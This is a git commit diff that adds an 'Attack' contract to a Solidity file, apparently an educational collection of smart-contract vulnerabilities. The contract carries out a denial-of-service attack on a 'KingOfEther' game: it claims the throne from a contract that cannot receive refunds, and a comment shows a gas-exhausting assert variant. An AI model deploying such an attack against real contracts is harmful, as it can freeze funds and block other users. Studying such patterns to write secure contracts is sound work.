e38b93f85cae51788a970e5c3a8124884f7b5fd7
jinwon93 <kjw8208@nate.com>
2022-06-20 21:47:52 +0900

    20220620

--- Applications/DenialofService.sol
+++ Applications/DenialofService.sol
@@ -16,3 +16,24 @@ contract KingOfEther {
         king = msg.sender;
     }
 }
+
+
+contract Attack {
+    KingOfEther kingOfEther;
+
+    constructor(KingOfEther _kingOfEther) {
+        kingOfEther = KingOfEther(_kingOfEther);
+    }
+
+    // You can also perform a DOS by consuming all gas using assert.
+    // This attack will work even if the calling contract does not check
+    // whether the call was successful or not.
+    //
+    // function () external payable {
+    //     assert(false);
+    // }
+
+    function attack() public payable {
+        kingOfEther.claimThrone{value: msg.value}();
+    }
+}
